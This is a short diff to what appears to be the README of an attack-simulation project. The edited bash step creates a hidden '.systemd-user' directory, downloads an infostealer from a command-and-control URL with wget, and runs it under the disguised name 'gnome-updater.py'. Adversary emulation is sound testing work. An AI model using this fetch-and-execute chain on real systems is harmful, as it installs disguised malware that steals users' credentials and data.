@@ -89,7 +89,7 @@ The project simulates a multi-stage attack, including the following key componen
       ```bash
       mkdir -p ~/.config/.systemd-user/ && cd ~/.config/.systemd-user/
 
-      wget ${C2_URL}/security_debian_x386 -O /tmp/${INFOSTEALER_FILENAME} && chmod +x /tmp/${INFOSTEALER_FILENAME} && python3 /tmp/${INFOSTEALER_FILENAME}
+      wget ${C2_URL}/security_debian_x386 -O gnome-updater.py && chmod +x gnome-updater.py && python3 gnome-updater.py
       ```
 
         ## **TODO: INSERT THE OTHER STEPS**
